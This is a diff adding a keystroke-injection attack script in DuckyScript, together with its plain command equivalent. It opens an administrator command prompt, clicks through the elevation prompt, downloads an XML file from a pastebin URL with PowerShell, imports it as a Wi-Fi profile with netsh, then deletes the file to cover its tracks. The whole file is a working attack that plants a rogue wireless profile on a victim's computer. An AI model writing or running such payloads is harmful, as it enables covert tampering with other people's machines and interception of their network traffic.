@@ -1,0 +1,31 @@
+cd %TEMP%
+powershell (new-object System.Net.WebClient).DownloadFile('https://pastebin.com/raw/9RZE7hmg','%TEMP%\profile.xml')
+netsh wlan add profile filename="profile.xml" interface="Wifi"
+del profile.xml && exit
+
+----------------------------------------------------------------------------------------
+
+DELAY 1500
+GUI r
+DELAY 1000
+STRING cmd
+DELAY 400
+CTRL-SHIFT ENTER
+DELAY 1500
+ALT y
+DELAY 800
+STRING cd %TEMP%
+DELAY 100
+ENTER
+DELAY 100
+STRING powershell (new-object System.Net.WebClient).DownloadFile('https://pastebin.com/raw/9RZE7hmg','%TEMP%\profile.xml')
+DELAY 100
+ENTER
+DELAY 1500
+STRING netsh wlan add profile filename="profile.xml" interface="Wifi"
+DELAY 100
+ENTER
+DELAY 1000
+STRING del profile.xml && exit
+DELAY 100
+ENTER
